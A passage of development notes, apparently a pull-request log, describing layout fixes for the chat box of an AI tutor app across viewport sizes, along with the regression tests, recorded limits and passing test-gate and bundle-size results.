  again at the page top. It checks the dock is back above the navigation
  at the page end, and adds a question put in the box without focus. The
  wide check runs at 1024×768, 1225×671, 1280×720, 1366×768 and 1440×900,
  loaded and on a first run. On a first run the download approval and
  Download & load must be above the dock, and the dock must not cut the
  welcome heading. Run from the rebased tip's source with its build as
  `LUMEN_URL`, it failed 3 ways: two kept or placed drafts, and 1225×671
  loaded.

New coverage for the moved selects: `audit:responsive` checks every Depth
and Answer length value in the Options sheet reads in full at each of its
viewports, including 320×568 and 360×800 at 200% text. The narrow
fine-pointer pass in `audit:controls` opens the sheet at 400 and 320 px
with 150% and 200% text and checks that neither the sheet nor the page
scrolls sideways and that both selects stay inside the sheet.

Limits, recorded:

- In a wide column with less than a line to spare (1225×671 and
  1024×768 on macOS fonts), the question box stays one line and scrolls
  inside, so the conversation keeps its minimum.
- On-device Lite still has no streaming follow (4.6 KB of route budget is
  left).

Gate on the fixed tree: `npm run check` passed (`audit:ai` 550/550, AI
eval 27 cases, hit@1 0.913). The startup entry is 715,912 bytes, the same
as the rebased tip. The route screens are 895,361 bytes: 1,047 more than
the rebased tip (894,314), 4,639 under the budget. `npm run check:browser`
passed all 13 suites on the first attempt with no retries (`audit:ai-ui`
193 s, `audit:phone-ai-ui` 59 s, `audit:controls` 144 select measurements
and 16 narrow fine-pointer screens, `audit:responsive` 478 layout and 367
control checks, `audit:a11y` 75 axe runs with the empty allowlist).

## Third review follow-up on 2026-09-29: chat window fit (#93, #94)

The branch was rebased onto main again (a79411c, the read-aloud fixes
#140); only the append-only doc rows conflicted. A second independent
re-verification found these open, reproduced against the rebased tip
(f48c5d9, built and served as `check:browser` serves a build) and fixed:

- On-device Lite on short wide windows, nothing asked yet, at the top of
  the page. 1280×609 is what a 1280×720 screen leaves Chrome. With the
  model loaded the docked question box (top 487 px) cut the welcome's
  heading (479–499 px); at 1024×640 and 1280×640 it covered the last 7 px
  of the welcome's line. On a first run it covered Download & load
  (492–536 px against the dock at 479 px, 509–553 against 510 at 1024×640).
  Measuring every tutor text and control under the dock found the same
  class on first runs at larger sizes. At 1280×720 the dock (590 px) cut
  the mode tabs (563–615 px) through their labels, and the welcome heading
  showed under its lower edge. At 1225×671 it covered the tabs too, and at
  1024×768 and 1366×768 the Grounding summary and the welcome's first
  lines. On a wide screen the page grows with the tutor, so a box docked
  before anything is asked always lies over the top of the page. Now, at
  981 px and wider, the box waits in the page flow until
  the first question, right under the welcome: the empty conversation no
  longer reserves its 360 px. The first question docks it, with the
  question above the dock. With the model loaded the box is at 565–675 px
  at every wide size, so its question line and Send (576–624 px) are on
  screen in windows 640 px tall and taller; at 1280×609 the top 33 px of
  that line are, and a short scroll shows the rest. A first run puts it
  under the welcome, below the window at 1280×720 and shorter (Send stays
  disabled until the model is loaded, and Download & load is in view).
  Phones are unchanged: #94 needs the box on screen at the first open
  there. Main kept the composer in the page flow, but 432 px tall.
- Mac tutor at 320×568 with 200% text, touch or a mouse, every theme: the
  suggested starts ran 35–308 px against the card's clipping edge at
  302 px, losing their right border and padding. The workspace's one
  column had no set width, so the Grounding toggle's unwrapped label
  (289 px of text plus padding) made it 313 px against 286 px of card. The
  conversation and the Grounding panel were both drawn past the edge; on
  main the Grounding toggle was clipped the same way. Below 1080 px the
  column is now `minmax(0, 1fr)`: the conversation is 15–301 px, the starts
  35–281 px, and the Grounding label shortens with its ellipsis. The
  branch's tighter phone welcome padding stays.
- A flaky check: `audit:phone-ai-ui` measured the Options sheet's controls
  (44 px) while the sheet was still sliding in. Paused mid-slide, at 50 ms
  and at 130 ms of the 200 ms animation, "Close request options" reads
  43.99997 px, the value that failed the gate twice under load; before 50
  ms and after the slide it reads 44 px. The sheet helpers in
  `audit:phone-ai-ui` and `audit:ai-ui` now wait for the sheet's
  animations, up to 2 s, before a check measures it. `audit:responsive`
  and `audit:controls` run with reduced motion, so their sheet has no
  animation, and `audit:a11y` already waits.
- Docs: at 1024×768 the Mac tutor's column also has no line to spare. The
  conversation is 261 px against its 260 px minimum and `--ai-field-max`
  is 48 px, so a long question or an Ask AI excerpt shows one line that
  scrolls, as at 1225×671. The limit above and the app guide now say so.

Assertions changed on purpose:

- `audit:phone-ai-ui` first open at 1280×720 required the question box to
  be docked and in view. At 981 px and wider it now requires the box in
  the page flow right under the welcome, covering nothing, and on screen
  with Send and Options at the page end. That is where Options opens,
  one tap, as before. Phones keep the docked, in-view checks.

Regression checks, each failing before the fix and passing after:

- `audit:phone-ai-ui` chat-fit: the wide check also runs at 1280×609,
  1024×640 and 1280×640, loaded and on a first run, next to 1024×768,
  1225×671, 1280×720, 1366×768 and 1440×900. At the top of the page no
  text or control of the tutor may be under the question box, and with
  nothing asked the box must be in the page flow right under the welcome
  (the conversation's end within 24 px) and on screen at the page end.
  Run from the rebased tip's source with its build as `LUMEN_URL`, it
  failed 34 ways. Text or controls were under the box in 11 states: the
  first open at 1280×720 in the app; first runs at 1024×768, 1225×671,
  1280×720 and 1366×768; and both states at 1280×609, 1024×640 and
  1280×640. At those three short sizes the older assertions failed too
  (the welcome with the model loaded, Download & load on a first run).
  The box was docked, not in the page flow, in all 17 states. Two checks
  keep the dock in use: the first question at 1280×609 and 1440×900 docks
  the box, with the question and then the answer's end above it, and a
  conversation from earlier in the session opens docked at 1280×609. Both
  pass on both trees.
- `audit:ai-ui` chat-fit: at 320×568 with 200% and 150% text and 400×800
  with 200%, with touch and with a mouse (the page's pointer is checked),
  in Paper, Night and Contrast, nothing in the tutor's card may be drawn
  past its edge, and the page must not scroll sideways. What a scroller,
  a clipping box or visually hidden text holds is left out. Against the
  rebased tip's build it failed at 320×568 with 200% text for both pointers
  in all three themes: the Grounding panel and the conversation were at
  15–328 px against the card's 15–301 px.

Limit, recorded: at 320 px with 200% text each suggested start's title
shows two short lines ending in an ellipsis. The mode badge's column is
5rem, 160 px at that size, which leaves the title 52 px. Main's starts,
widened by the same overflow (43–300 px), left it about 63 px, so it was
clamped the same way there.

Kept as it was: value fit at phone large text for the Review strip was
named again. `audit:responsive` already checks `review-values`, every
option of `.review-settings-strip select`, at every viewport, including
phone-large-text (360×800 at 200%), from #92.

Gate on the fixed tree: `npm run check` passed (`audit:ai` 563/563, AI
eval 27 cases, hit@1 0.913). The startup entry is 716,616 bytes, the same
as the rebased tip. The route screens are 899,632 bytes: 213 more than
the rebased tip (899,419), 368 under the budget, which was not raised.
`npm run check:browser` passed all 13 suites on the first attempt with no
retries, at a load average of about 12–15 from other work on the machine
(`audit:ai-ui` 201 s, `audit:phone-ai-ui` 76 s, `audit:controls` 144
select measurements and 16 narrow fine-pointer screens,
`audit:responsive` 478 layout and 367 control checks, `audit:a11y` 75 axe
runs with the empty allowlist). Only docs and one source comment changed
after that run; a rebuild gives the same startup and route byte counts.
